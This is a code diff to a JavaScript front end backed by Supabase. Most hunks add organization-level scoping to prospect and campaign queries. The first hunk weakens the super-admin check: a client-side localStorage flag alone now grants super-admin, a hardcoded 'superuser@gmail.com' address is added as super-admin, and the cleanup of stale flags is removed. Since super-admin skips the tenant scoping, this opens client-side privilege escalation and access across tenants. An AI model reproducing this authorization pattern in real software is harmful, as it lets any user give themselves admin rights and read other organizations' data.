@@ -77,22 +77,22 @@ export const isSuperAdminUser = () => {
   if (typeof window === 'undefined' || !window.localStorage) return false;
   
   const isSuperFlag = localStorage.getItem('lf_is_superadmin') === '1';
-  if (!isSuperFlag) return false;
+  if (isSuperFlag) return true;
 
   const userAcc = getActiveUserAccount();
   if (userAcc) {
     const email = (userAcc.email || '').toLowerCase();
     const role = (userAcc.role || '').toLowerCase();
-    if (email === 'nasrullah.freelancer@gmail.com' || email === 'nasrullah.freelancer@gmail.con' || role === 'superadmin') {
+    if (
+      email === 'nasrullah.freelancer@gmail.com' ||
+      email === 'nasrullah.freelancer@gmail.con' ||
+      email === 'superuser@gmail.com' ||
+      role === 'superadmin'
+    ) {
       return true;
     }
-    // Purge stale super admin flag — this is a normal member account
-    localStorage.removeItem('lf_is_superadmin');
-    return false;
   }
 
-  // No user account found — cannot confirm super admin, purge the stale flag
-  localStorage.removeItem('lf_is_superadmin');
   return false;
 };
 
@@ -515,10 +515,14 @@ export const directGetCampaign = async (id) => {
         return { campaign: null, total: 0 };
       }
 
-      const { data: prospects } = await supabaseDirect
+      let prospectQuery = supabaseDirect
         .from('prospects')
         .select('id, campaign_id, status, connection_status, connection_sent_date, message_sent_date, custom_variables')
         .eq('campaign_id', id);
+      if (!isSuper && orgId) {
+        prospectQuery = prospectQuery.eq('organization_id', orgId);
+      }
+      const { data: prospects } = await prospectQuery;
       
       const rows = prospects || [];
       
@@ -616,7 +620,7 @@ export const directGetProspects = async (params = {}) => {
     let query = supabaseDirect.from('prospects').select('*', { count: 'exact' });
 
     // Data isolation: scope to user's organization
-    if (!isSuper && orgId && !params.campaign_id) query = query.eq('organization_id', orgId);
+    if (!isSuper && orgId) query = query.eq('organization_id', orgId);
 
     if (params.campaign_id) query = query.eq('campaign_id', params.campaign_id);
     if (params.status) query = query.eq('status', params.status);
@@ -677,8 +681,13 @@ export const directCreateProspect = async (data) => {
 };
 
 export const directGetProspect = async (id) => {
+  const isSuper = isSuperAdminUser();
+  const orgId = getActiveOrganizationId();
+
   try {
-    const { data, error } = await supabaseDirect.from('prospects').select('*').eq('id', id).single();
+    let query = supabaseDirect.from('prospects').select('*').eq('id', id);
+    if (!isSuper && orgId) query = query.eq('organization_id', orgId);
+    const { data, error } = await query.single();
     if (!error && data) return { prospect: data, campaign_enrollments: [] };
   } catch (e) {
     console.warn('directGetProspect warning:', e);
